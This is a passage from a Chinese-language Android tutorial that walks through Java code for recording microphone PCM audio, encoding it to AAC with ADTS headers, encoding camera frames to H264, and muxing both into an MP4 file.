mediaMuxerWrapper; private boolean working = false; private BlockingQueue&lt;byte[]&gt; audioQueue = new LinkedBlockingQueue&lt;&gt;(); private BlockingQueue&lt;byte[]&gt; videoQueue = new LinkedBlockingQueue&lt;&gt;(); private BlockingQueue&lt;AacFrame&gt; audioEncodeQueue = new LinkedBlockingQueue&lt;&gt;(); private BlockingQueue&lt;H264Frame&gt; videoEncodeQueue = new LinkedBlockingQueue&lt;&gt;(); private Handler handler = new Handler(); @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_video); findViewById(R.id.btn).setOnClickListener(this); SurfaceView surfaceView = (SurfaceView) findViewById(R.id.surface_view); surfaceView.getHolder().addCallback(this); checkDir(); pcmRecorder = new PcmRecorder(44100, 1, 16, PCM_FILE, audioQueue); aacEncoder = new AacEncoder(audioQueue, AAC_FILE, pcmRecorder.getSampleRate(), pcmRecorder.getChannel(), pcmRecorder.getBitWidth(), audioEncodeQueue); aacEncoder.setCallback(new AacEncoder.Callback() &#123; @Override public void onEncodeFinish() &#123; mediaMuxerWrapper.stopAudio(); toast(\"aac encode finish !\"); &#125; @Override public void onFormatChange(MediaFormat format) &#123; mediaMuxerWrapper.startMuxAudio(format); &#125; &#125;); camera = Camera.open(); camera.setDisplayOrientation(90); Camera.Parameters parameters = camera.getParameters(); List&lt;int[]&gt; frameRateList = parameters.getSupportedPreviewFpsRange(); int frameRateRange[] = frameRateList.get(frameRateList.size() / 2); parameters.setPreviewFpsRange(frameRateRange[0], frameRateRange[1]); List&lt;Camera.Size&gt; sizeList = parameters.getSupportedVideoSizes(); Camera.Size size = sizeList.get(sizeList.size() / 2); parameters.setPreviewSize(size.width, size.height); parameters.setPreviewFormat(ImageFormat.NV21); camera.setParameters(parameters); camera.setPreviewCallback(new Camera.PreviewCallback() &#123; @Override public void onPreviewFrame(byte[] data, Camera camera) &#123; if (working &amp;&amp; data != null) &#123; Log.i(TAG, \"data size \" + data.length); videoQueue.add(data); &#125; &#125; &#125;); int frameRate = (frameRateRange[0] + frameRateRange[1]) / 2 / 1000; h264Encoder = new H264Encoder(videoQueue, H264_FILE, size.width, size.height, frameRate, videoEncodeQueue); h264Encoder.setCallback(new H264Encoder.Callback() &#123; @Override public void onEncodeFinish() &#123; mediaMuxerWrapper.stopVideo(); toast(\"h264 encode finish !\"); &#125; @Override public void onFormatChange(MediaFormat format) &#123; mediaMuxerWrapper.startMuxVideo(format); &#125; &#125;); mediaMuxerWrapper = new MediaMuxerWrapper(videoEncodeQueue, audioEncodeQueue, MP4_FILE); mediaMuxerWrapper.setCallback(new MediaMuxerWrapper.Callback() &#123; @Override public void onMuxFinish() &#123; toast(\"mux finish !\"); &#125; &#125;); &#125; @Override public void surfaceCreated(SurfaceHolder holder) &#123; try &#123; camera.setPreviewDisplay(holder); camera.startPreview(); &#125; catch (IOException e) &#123; Log.e(TAG, \"error : \" + e.toString()); &#125; &#125; @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) &#123; &#125; @Override public void surfaceDestroyed(SurfaceHolder holder) &#123; &#125; @Override public void onClick(View v) &#123; if (!working) &#123; ((Button) v).setText(\"stop\"); start(); &#125; else &#123; ((Button) v).setText(\"finish\"); stop(); v.setClickable(false); &#125; &#125; private void start() &#123; if (working) &#123; return; &#125; working = true; pcmRecorder.start(); aacEncoder.start(); h264Encoder.start(); toast(\"start recording !\"); &#125; private void stop() &#123; if (!working) &#123; return; &#125; working = false; pcmRecorder.stop(); aacEncoder.stop(); h264Encoder.stop(); toast(\"finish recording !\"); &#125; private void checkDir() &#123; File dir = new File(DIR); if (!dir.exists()) &#123; dir.mkdirs(); &#125; &#125; private void toast(final String str) &#123; handler.post(new Runnable() &#123; @Override public void run() &#123; Toast.makeText(VideoActivity.this, str, Toast.LENGTH_SHORT).show(); &#125; &#125;); &#125;&#125; 界面的Activity主要是把各个模块的逻辑汇总协同工作的地方，接下来我们来单独分析每个部分 音频录制音频录制部分主要有： PCM录制器 AAC格式编码器 PCM录制器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125public class PcmRecorder &#123; private static final String TAG = \"PcmRecorder\"; private int sampleRate; private int channel; private int bitWidth; private AudioRecord audioRecord; private int bufferSize; private byte buffer[]; private FileOutputStream fos = null; private BlockingQueue&lt;byte[]&gt; queue = null; private Handler workHandler; private boolean work; PcmRecorder(int sampleRate, int channel, int bitWidth, String fileOutputPath, BlockingQueue&lt;byte[]&gt; queue) &#123; this(sampleRate, channel, bitWidth); File outputFile = new File(fileOutputPath); try &#123; fos = new FileOutputStream(outputFile); &#125; catch (IOException e) &#123; throw new IllegalStateException(\"create file output stream fail with \" + e.toString()); &#125; if (queue == null) &#123; throw new IllegalArgumentException(\"queue can not be null\"); &#125; this.queue = queue; &#125; private PcmRecorder(int sampleRate, int channel, int bitWidth) &#123; this.sampleRate = sampleRate; this.channel = channel == 2 ? channel : 1; this.bitWidth = bitWidth == 8 ? bitWidth : 16; int channelConfig = channel == 2 ? AudioFormat.CHANNEL_IN_STEREO : AudioFormat.CHANNEL_IN_MONO; int audioFormat = bitWidth == 8 ? AudioFormat.ENCODING_PCM_8BIT : AudioFormat.ENCODING_PCM_16BIT; bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat); buffer = new byte[bufferSize]; Log.i(TAG, \"sampleRate : \" + sampleRate + \" channel : \" + channel + \" bitWidth : \" + bitWidth + \" bufferSize : \" + bufferSize); audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, bufferSize); Log.i(TAG, \"state : \" + audioRecord.getState()); HandlerThread workThread = new HandlerThread(\"recordThread\"); workThread.start(); workHandler = new RecordHandler(workThread.getLooper()); &#125; public int getSampleRate() &#123; return sampleRate; &#125; public int getChannel() &#123; return channel; &#125; public int getBitWidth() &#123; return bitWidth; &#125; synchronized void start() &#123; if (work) &#123; return; &#125; work = true; audioRecord.startRecording(); workHandler.sendEmptyMessage(0); &#125; synchronized void stop() &#123; if (!work) &#123; return; &#125; work = false; audioRecord.stop(); &#125; private class RecordHandler extends Handler &#123; RecordHandler(Looper looper) &#123; super(looper); &#125; @Override public void handleMessage(Message msg) &#123; super.handleMessage(msg); Log.i(TAG, \"work handler start\"); while (work) &#123; int result = audioRecord.read(buffer, 0, bufferSize); if (result == AudioRecord.ERROR_INVALID_OPERATION || result == AudioRecord.ERROR_BAD_VALUE) &#123; Log.e(TAG, \"record read fail ! just continue !\"); continue; &#125; Log.i(TAG, \"read result : \" + result); if (fos != null) &#123; try &#123; fos.write(buffer, 0, result); fos.flush(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; &#125; if (queue != null) &#123; boolean offerResult = queue.offer(buffer); Log.i(TAG, \"offerResult \" + offerResult + \" queue size \" + queue.size()); &#125; &#125; if (fos != null) &#123; try &#123; fos.close(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; &#125; Log.i(TAG, \"work handler finish\"); &#125; &#125;&#125; PCM录制使用的是官方的AudioRecord 官方API文档：https://developer.android.com/reference/android/media/AudioRecord 相关要注意的事项已经在学习笔记（一）中提及，这里不再赘述 AAC格式编码器录制出视频的PCM数据后，我们需要把其编码为AAC格式，相关代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239public class AacEncoder &#123; private static final String TAG = \"AacEncoder\"; private static final int AAC_PROFILE = MediaCodecInfo.CodecProfileLevel.AACObjectLC; private static final int ADTS_HEADER_SIZE = 7; private MediaCodec mediaCodec; private BlockingQueue&lt;byte[]&gt; queue; private BlockingQueue&lt;AacFrame&gt; outputQueue; private FileOutputStream fos; private long totalSize; private int bufferSize; private ByteBuffer[] inputByteBuffers; private ByteBuffer[] outputByteBuffers; private boolean work = false; private Thread workThread; private int sampleRate; private int channel; private int bitWidth; private Callback callback; // 有些手机压缩后质量奇差，硬件不好 AacEncoder(BlockingQueue&lt;byte[]&gt; inputQueue, String outputFile, int sampleRate, int channel, int bitWidth, BlockingQueue&lt;AacFrame&gt; outputQueue) &#123; if (inputQueue == null) &#123; throw new IllegalArgumentException(\"inputQueue can not be null !\"); &#125; queue = inputQueue; this.outputQueue = outputQueue; String mime; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123; mime = MediaFormat.MIMETYPE_AUDIO_AAC; &#125; else &#123; mime = \"audio/mp4a-latm\"; &#125; try &#123; fos = new FileOutputStream(new File(outputFile)); mediaCodec = MediaCodec.createEncoderByType(mime); &#125; catch (IOException e) &#123; throw new IllegalArgumentException(e.toString()); &#125; MediaFormat mediaFormat = new MediaFormat(); mediaFormat.setString(MediaFormat.KEY_MIME, mime); mediaFormat.setInteger(MediaFormat.KEY_AAC_PROFILE, AAC_PROFILE); mediaFormat.setInteger(MediaFormat.KEY_BIT_RATE, sampleRate * channel * bitWidth); mediaFormat.setInteger(MediaFormat.KEY_CHANNEL_COUNT, channel); // TODO lmr 帧率对不上视频 ？ this.sampleRate = sampleRate; this.channel = channel == 2 ? 2 : 1; this.bitWidth = bitWidth; int channelConfig = channel == 2 ? AudioFormat.CHANNEL_IN_STEREO : AudioFormat.CHANNEL_IN_MONO; int audioFormat = bitWidth == 8 ? AudioFormat.ENCODING_PCM_8BIT : AudioFormat.ENCODING_PCM_16BIT; bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat); mediaFormat.setInteger(MediaFormat.KEY_MAX_INPUT_SIZE, bufferSize); mediaFormat.setInteger(MediaFormat.KEY_SAMPLE_RATE, sampleRate); mediaCodec.configure(mediaFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE); totalSize = 0; &#125; public void setCallback(Callback callback) &#123; this.callback = callback; &#125; public synchronized void start() &#123; if (work) &#123; return; &#125; work = true; mediaCodec.start(); inputByteBuffers = mediaCodec.getInputBuffers(); outputByteBuffers = mediaCodec.getOutputBuffers(); workThread = new Thread(new Runnable() &#123; @Override public void run() &#123; Log.i(TAG, \"begin aac encode\"); while (work || !queue.isEmpty()) &#123; try &#123; Log.i(TAG, \"before take data\"); byte[] data = queue.take(); Log.i(TAG, \"wait for input index\"); int inputIndex = mediaCodec.dequeueInputBuffer(-1); if (inputIndex &gt;= 0) &#123; Log.i(TAG, \"input index : \" + inputIndex + \" data size : \" + data.length); ByteBuffer inputByteBuffer = inputByteBuffers[inputIndex]; inputByteBuffer.clear(); inputByteBuffer.put(data); inputByteBuffer.limit(data.length); long time = getPresentationTimeUs(); totalSize += data.length; Log.i(TAG, \"input data total size \" + totalSize + \" time \" + time); mediaCodec.queueInputBuffer(inputIndex, 0, data.length, time, 0); &#125; MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo(); int outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 0); Log.i(TAG, \"output index : \" + outputIndex + \" data size : \" + bufferInfo.size + \" offset : \" + bufferInfo.offset); while (outputIndex != MediaCodec.INFO_TRY_AGAIN_LATER) &#123; if (outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) &#123; Log.i(TAG, \"get output format\"); if (callback != null) &#123; callback.onFormatChange(mediaCodec.getOutputFormat()); &#125; &#125; else if (outputIndex == MediaCodec.INFO_OUTPUT_BUFFERS_CHANGED) &#123; Log.i(TAG, \"output buffers change !\"); outputByteBuffers = mediaCodec.getOutputBuffers(); &#125; else &#123; int packetSize = bufferInfo.size + ADTS_HEADER_SIZE; ByteBuffer outputByteBuffer = outputByteBuffers[outputIndex]; outputByteBuffer.position(bufferInfo.offset); outputByteBuffer.limit(bufferInfo.offset + bufferInfo.size); byte[] dataBytes = new byte[bufferInfo.size]; outputByteBuffer.get(dataBytes); Log.i(TAG, \"output buffer info time \" + bufferInfo.presentationTimeUs); if (outputQueue != null) &#123; // 这个时间戳要保持一直增加，不然的话mux的时候会卡死 // 取 bufferInfo.presentationTimeUs 会出现有增有减的情况 outputQueue.add( new AacFrame(dataBytes, getPresentationTimeUs())); &#125; byte[] packetBytes = new byte[packetSize]; addADTSHeader(packetBytes, packetSize); System.arraycopy(dataBytes, 0, packetBytes, 7, bufferInfo.size); try &#123; fos.write(packetBytes); fos.flush(); Log.i(TAG, \"write bytes finish\"); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; mediaCodec.releaseOutputBuffer(outputIndex, false); &#125; outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 0); Log.i(TAG, \"output index : \" + outputIndex + \" data size : \" + bufferInfo.size + \" offset : \" + bufferInfo.offset); &#125; &#125; catch (InterruptedException e) &#123; // ignore &#125; &#125; try &#123; fos.close(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; mediaCodec.stop(); mediaCodec.release(); Log.i(TAG, \"finish aac encode\"); if (callback != null) &#123; callback.onEncodeFinish(); &#125; &#125; &#125;); workThread.start(); &#125; private void addADTSHeader(byte[] packetBytes, int totalSize) &#123; if (packetBytes.length &lt; 7) &#123; throw new IllegalStateException(\"the adts header bytes size is less than 7 !\"); &#125; for (int i = 0; i &lt; 7; i++) &#123; packetBytes[i] = 0; &#125; // adts header contains 2 part // first part : adts fixed header // syncword 0xFFF size:12 packetBytes[0] = (byte) 0xFF; packetBytes[1] |= 0xF &lt;&lt; 4; // ID MPEG Version: 0 for MPEG-4，1 for MPEG-2 size:1 packetBytes[1] |= 1 &lt;&lt; 3; // Layer 00 size:2 packetBytes[1] |= 0 &lt;&lt; 1; // protection_absent Warning, set to 1 if there is no CRC and 0 if there is CRC size:1 (we use 7 header size , means is 1) packetBytes[1] |= 1; // profile aac 级别 size:2 packetBytes[2] |= (AAC_PROFILE - 1) &lt;&lt; 6; // sampling_frequency_index 采样率下标 size:4 44100hz means 0x4 packetBytes[2] |= 4 &lt;&lt; 2; // private_bit 私有位，没用 size 1 packetBytes[2] |= 0 &lt;&lt; 1; // channel_configuration 声道数 size 3 packetBytes[2] |= channel &gt;&gt;&gt; 2; packetBytes[3] |= channel &lt;&lt; 6; // original_copy：编码时设置为0，解码时忽略 size 1 packetBytes[3] |= 0 &lt;&lt; 5; // home：编码时设置为0，解码时忽略 size 1 packetBytes[3] |= 0 &lt;&lt; 4; // second part : adts variable header // copyrighted_id_bit：编码时设置为0，解码时忽略 size 1 packetBytes[3] |= 0 &lt;&lt; 3; // copyrighted_id_start：编码时设置为0，解码时忽略 size 1 packetBytes[3] |= 0 &lt;&lt; 2; // aac_frame_length：ADTS帧长度包括ADTS长度和AAC声音数据长度的和 size 13 packetBytes[3] |= totalSize &gt;&gt;&gt; 11; packetBytes[4] |= totalSize &gt;&gt;&gt; 3; packetBytes[5] |= totalSize &lt;&lt; 5; // adts_buffer_fullness：固定为0x7FF。表示是码率可变的码流 size 11 packetBytes[5] |= 0x7FF &gt;&gt;&gt; 6; packetBytes[6] |= 0x7FF &lt;&lt; 2; // number_of_raw_data_blocks_in_frame：表示当前帧有number_of_raw_data_blocks_in_frame + 1 个原始帧(一个AAC原始帧包含一段时间内1024个采样及相关数据) size 2 packetBytes[6] |= 0; &#125; public synchronized void stop() &#123; if (!work) &#123; return; &#125; work = false; if (workThread != null &amp;&amp; workThread.isAlive()) &#123; workThread.interrupt(); &#125; &#125; private long getPresentationTimeUs() &#123; return (long) (totalSize * 8.0 / sampleRate / channel / bitWidth * 1000 * 1000); &#125; public interface Callback &#123; void onEncodeFinish(); void onFormatChange(MediaFormat format); &#125;&#125; 这里使用的是系统提供的MediaCodec接口进行硬件编码，官方文档如下：https://developer.android.com/reference/android/media/MediaCodec这里我们使用的MIME为audio/mp4a-latm，同时我们用了一个BlockingQueue阻塞队列来循环编码，每当一段PCM数据准备好之后，就读取并塞到MediaCodec中进行编码 由于MediaCodec编码出来的AAC数据只是原始的数据流，因此我们需要为其补上元数据（即adts头部信息）有关adts头部信息相关的内容可以参考下面的博客：https://blog.csdn.net/simongyley/article/details/8754157具体的头部信息填写可参考上面代码中的方法addADTSHeader 有一个需要注意的点是，由于MediaCodec输出的编码时间有点问题（具体原因未明，主要表现是输出的时间有增有减），因此这里使用的是getPresentationTimeUs方法来计算帧时间，防止后面使用MediaMuxer混合出现卡死的情况 值得注意的是，据博主了解与尝试，由于Android碎片化的缘故，音频使用硬件编码质量并不十分稳定，而音频软件编码的耗时与稳定性都相对不错，因此建议大家学习一下使用如FFMPEG的工具来软件编码 编码后，输出的AAC帧如下所示： 12345678910public class AacFrame &#123; public byte[] data; public long presentationTimeUs; public AacFrame(byte[] data, long presentationTimeUs) &#123; this.data = data; this.presentationTimeUs = presentationTimeUs; &#125;&#125; 视频录制视频录制部分主要是把摄像头回调回来的YUV数据经过处理后，使用硬件编码成H264格式输出相关代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267public class H264Encoder &#123; private static final String TAG = \"H264Encoder\"; private MediaCodec mediaCodec; private BlockingQueue&lt;byte[]&gt; queue; private BlockingQueue&lt;H264Frame&gt; outputQueue; private FileOutputStream fos; private int frameRate; private int width; private int height; private int inputIndexCounter; private ByteBuffer[] inputByteBuffers; private ByteBuffer[] outputByteBuffers; private byte[] configBytes; private byte[] tempBuffer; private boolean work = false; private Thread workThread; private Callback callback; /** * 根据 stackOverFlow 上老哥的回答 * https://stackoverflow.com/questions/36114808/android-setting-presentation-time-of-mediacodec * 其实 h264 只有流，并没有时间相关的信息，在某些硬件上可能播放会有问题（画面一闪而过，时间戳对不上） * 考虑封装成 mp4 处理这个问题 */ H264Encoder(BlockingQueue&lt;byte[]&gt; inputQueue, String outputFile, int width, int height, int frameRate, BlockingQueue&lt;H264Frame&gt; outputQueue) &#123; if (inputQueue == null) &#123; throw new IllegalArgumentException(\"inputQueue can not be null !\"); &#125; queue = inputQueue; this.outputQueue = outputQueue; String mime; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123; mime = MediaFormat.MIMETYPE_VIDEO_AVC; &#125; else &#123; mime = \"video/avc\"; &#125; try &#123; fos = new FileOutputStream(new File(outputFile)); mediaCodec = MediaCodec.createEncoderByType(mime); &#125; catch (IOException e) &#123; throw new IllegalArgumentException(e.toString()); &#125; // 我们需要把视频内容旋转90度，长宽对调 MediaFormat mediaFormat = MediaFormat.createVideoFormat(mime, height, width); mediaFormat.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar); // NV12 mediaFormat.setInteger(MediaFormat.KEY_BIT_RATE, width * height * 5); mediaFormat.setInteger(MediaFormat.KEY_FRAME_RATE, frameRate); mediaFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); Bundle bundle = new Bundle(); bundle.putInt(MediaFormat.KEY_I_FRAME_INTERVAL, 1); mediaCodec.setParameters(bundle); mediaCodec.configure(mediaFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE); this.frameRate = frameRate; this.width = width; this.height = height; tempBuffer = new byte[width * height * 3 / 2]; Log.i(TAG, String.format(\"width is %d height is %d frameRate is %d tempBuffer size is %d\", width, height, frameRate, tempBuffer.length)); &#125; public void setCallback(Callback callback) &#123; this.callback = callback; &#125; public synchronized void start() &#123; if (work) &#123; return; &#125; work = true; mediaCodec.start(); inputByteBuffers = mediaCodec.getInputBuffers(); outputByteBuffers = mediaCodec.getOutputBuffers(); workThread = new Thread(new Runnable() &#123; @Override public void run() &#123; inputIndexCounter = 0; while (work || !queue.isEmpty()) &#123; try &#123; Log.i(TAG, \"try take data, left data \" + queue.size()); byte[] data = queue.take(); NV21ToNV12(data, tempBuffer); NV12Rotate90(tempBuffer, data); Log.i(TAG, \"take data size \" + data.length); int inputIndex = mediaCodec.dequeueInputBuffer(-1); Log.i(TAG, \"get input index \" + inputIndex); if (inputIndex &gt;= 0) &#123; ByteBuffer inputBuffer = inputByteBuffers[inputIndex]; inputBuffer.clear(); inputBuffer.put(data); inputBuffer.limit(data.length); int flags = !work &amp;&amp; queue .isEmpty() ? MediaCodec.BUFFER_FLAG_END_OF_STREAM : 0; long time = getPresentationTimeUs(inputIndexCounter); Log.i(TAG, \"input indexCounter \" + inputIndexCounter + \" time \" + time); mediaCodec.queueInputBuffer(inputIndex, 0, data.length, time, flags); inputIndexCounter++; &#125; MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo(); int outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 0); Log.i(TAG, \"get output index \" + outputIndex); while (outputIndex != MediaCodec.INFO_TRY_AGAIN_LATER) &#123; if (outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) &#123; Log.i(TAG, \"get output format\"); if (callback != null) &#123; callback.onFormatChange(mediaCodec.getOutputFormat()); &#125; &#125; else if (outputIndex == MediaCodec.INFO_OUTPUT_BUFFERS_CHANGED) &#123; Log.i(TAG, \"output buffers change !\"); outputByteBuffers = mediaCodec.getOutputBuffers(); &#125; else &#123; ByteBuffer outputBuffer = outputByteBuffers[outputIndex]; byte[] outData = new byte[bufferInfo.size]; outputBuffer.position(bufferInfo.offset); outputBuffer.get(outData); if ((bufferInfo.flags &amp; MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) &#123; Log.i(TAG, \"flag codec config !\"); configBytes = outData; &#125; else if ((bufferInfo.flags &amp; MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0) &#123; Log.i(TAG, \"flag key frame\"); byte[] keyframe = new byte[bufferInfo.size + configBytes.length]; System.arraycopy(configBytes, 0, keyframe, 0, configBytes.length); System.arraycopy(outData, 0, keyframe, configBytes.length, outData.length); if (outputQueue != null) &#123; Log.i(TAG, \"output time \" + bufferInfo.presentationTimeUs); outputQueue .add(new H264Frame(keyframe, bufferInfo.flags, bufferInfo.presentationTimeUs)); &#125; try &#123; fos.write(keyframe); fos.flush(); &#125; catch (IOException e) &#123; // ignore &#125; &#125; else &#123; Log.i(TAG, \"flag nothing\"); if (outputQueue != null) &#123; Log.i(TAG, \"output time \" + bufferInfo.presentationTimeUs); outputQueue .add(new H264Frame(outData, bufferInfo.flags, bufferInfo.presentationTimeUs)); &#125; try &#123; fos.write(outData); fos.flush(); &#125; catch (IOException e) &#123; // ignore &#125; &#125; mediaCodec.releaseOutputBuffer(outputIndex, false); &#125; outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 0); Log.i(TAG, \"get output index \" + outputIndex); &#125; &#125; catch (InterruptedException e) &#123; // ignore &#125; &#125; try &#123; fos.close(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; mediaCodec.stop(); mediaCodec.release(); Log.i(TAG, \"finish h264 encode\"); if (callback != null) &#123; callback.onEncodeFinish(); &#125; &#125; &#125;); workThread.start(); &#125; public synchronized void stop() &#123; if (!work) &#123; return; &#125; work = false; if (workThread != null &amp;&amp; workThread.isAlive()) &#123; workThread.interrupt(); &#125; &#125; private void NV21ToNV12(byte[] nv21, byte[] nv12) &#123; if (nv21 == null || nv12 == null) return; int frameSize = width * height; int j; // Y System.arraycopy(nv21, 0, nv12, 0, frameSize); // U for (j = 0; j &lt; frameSize / 2; j += 2) &#123; nv12[frameSize + j] = nv21[frameSize + j + 1]; &#125; // V for (j = 0; j &lt; frameSize / 2; j += 2) &#123; nv12[frameSize + j + 1] = nv21[frameSize + j]; &#125; &#125; private void NV12Rotate90(byte[] nv12, byte[] nv12rotate90) &#123; if (nv12 == null || nv12rotate90 == null) return; int frameSize = width * height; // Y for (int i = 0; i &lt; frameSize; i++) &#123; int x = i % height; int y = i / height; int oldX = y; int oldY = height - x - 1; nv12rotate90[i] = nv12[oldX + oldY * width]; &#125; int halfHeight = height / 2; // U for (int j = 0; j &lt; frameSize / 2; j += 2) &#123; int x = j % height; int y = j / height; int oldX = y * 2; int oldY = halfHeight - 1 - x / 2; int rotateIndex = frameSize + j; int originIndex = frameSize + oldX + oldY * width; try &#123; nv12rotate90[rotateIndex] = nv12[originIndex]; &#125; catch (IndexOutOfBoundsException e) &#123; Log.e(TAG, String.format( \"error with j %d x %d y %d oldX %d oldY %d rotateIndex %d originIndex %d\", j, x, y, oldX, oldY, rotateIndex, originIndex)); throw e; &#125; &#125; // V for (int j = 1; j &lt; frameSize / 2; j += 2) &#123; int x = j % height; int y = j / height; int oldX = y * 2 + 1; int oldY = halfHeight - 1 - (x - 1) / 2; nv12rotate90[frameSize + j] = nv12[frameSize + oldX + oldY * width]; &#125; &#125; private long getPresentationTimeUs(int frameIndex) &#123; return frameIndex * 1000 * 1000 / frameRate; &#125; public interface Callback &#123; void onEncodeFinish(); void onFormatChange(MediaFormat format); &#125;&#125; 这里大部分内容与学习笔记（二）中所提及的一样，主要注意的就是YUV格式的转换以及画面内容旋转的问题，在此不再赘述还有当我们要把音频与视频打包合成MP4的时候，一些MediaCodec.BufferInfo的flag信息以及视频时间戳也是必不可少的 编码后的H264帧如下所示： 123456789101112public class H264Frame &#123; public byte[] data; public int flags; public long presentationTimeUs; public H264Frame(byte[] data, int flags, long presentationTimeUs) &#123; this.data = data; this.flags = flags; this.presentationTimeUs = presentationTimeUs; &#125;&#125; 音视频打包混合在分别编码出aac音频以及h264视频数据后，我们需要把他们打包混合成MP4文件相关代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174public class MediaMuxerWrapper &#123; private static final String TAG = \"MediaMuxerWrapper\"; private BlockingQueue&lt;H264Frame&gt; videoQueue; private BlockingQueue&lt;AacFrame&gt; audioQueue; private MediaMuxer mediaMuxer; private CyclicBarrier startCyclicBarrier; private CyclicBarrier stopCyclicBarrier; private int videoIndex; private boolean videoWork = false; private Thread videoWorkThread; private int audioIndex; private boolean audioWork = false; private Thread audioWorkThread; private Callback callback; public MediaMuxerWrapper(BlockingQueue&lt;H264Frame&gt; videoQueue, BlockingQueue&lt;AacFrame&gt; audioQueue, String outputFile) &#123; if (videoQueue == null) &#123; throw new IllegalArgumentException(\"videoQueue can not be null !\"); &#125; this.videoQueue = videoQueue; if (audioQueue == null) &#123; throw new IllegalArgumentException(\"audioQueue can not be null !\"); &#125; this.audioQueue = audioQueue; try &#123; mediaMuxer = new MediaMuxer(outputFile, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4); &#125; catch (IOException e) &#123; throw new IllegalArgumentException(e.toString()); &#125; startCyclicBarrier = new CyclicBarrier(2, new Runnable() &#123; @Override public void run() &#123; mediaMuxer.start(); Log.i(TAG, \"mux both start\"); &#125; &#125;); stopCyclicBarrier = new CyclicBarrier(2, new Runnable() &#123; @Override public void run() &#123; mediaMuxer.stop(); mediaMuxer.release(); Log.i(TAG, \"mux both finish\"); if (callback != null) &#123; callback.onMuxFinish(); &#125; &#125; &#125;); &#125; public void setCallback(Callback callback) &#123; this.callback = callback; &#125; public void startMuxVideo(MediaFormat mediaFormat) &#123; if (videoWork) &#123; return; &#125; videoWork = true; videoIndex = mediaMuxer.addTrack(mediaFormat); videoWorkThread = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; startCyclicBarrier.await(); while (videoWork || !videoQueue.isEmpty()) &#123; H264Frame frame = videoQueue.poll(5, TimeUnit.SECONDS); if (frame == null) &#123; Log.i(TAG, \"video take data null !\"); continue; &#125; Log.i(TAG, \"video take data, data left \" + videoQueue.size()); ByteBuffer buffer = ByteBuffer.allocate(frame.data.length); buffer.put(frame.data); MediaCodec.BufferInfo info = new MediaCodec.BufferInfo(); info.offset = 0; info.size = frame.data.length; info.presentationTimeUs = frame.presentationTimeUs; info.flags = frame.flags; Log.i(TAG, \"video info flags \" + info.flags + \" time \" + info.presentationTimeUs); if ((info.flags &amp; MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0) &#123; Log.i(TAG, \"video key frame !\"); &#125; mediaMuxer.writeSampleData(videoIndex, buffer, info); Log.i(TAG, \"video write sample data finish\"); &#125; &#125; catch (InterruptedException | BrokenBarrierException e) &#123; // ignore Log.i(TAG, \"mux video interrupted ! \" + e.toString()); &#125; Log.i(TAG, \"mux video finish, await\"); try &#123; stopCyclicBarrier.await(); &#125; catch (InterruptedException | BrokenBarrierException e) &#123; // ignore &#125; &#125; &#125;); videoWorkThread.start(); &#125; public void stopVideo() &#123; if (!videoWork) &#123; return; &#125; videoWork = false; &#125; public void startMuxAudio(MediaFormat mediaFormat) &#123; if (audioWork) &#123; return; &#125; audioWork = true; audioIndex = mediaMuxer.addTrack(mediaFormat); audioWorkThread = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; startCyclicBarrier.await(); while (audioWork || !audioQueue.isEmpty()) &#123; AacFrame frame = audioQueue.poll(5, TimeUnit.SECONDS); if (frame == null) &#123; 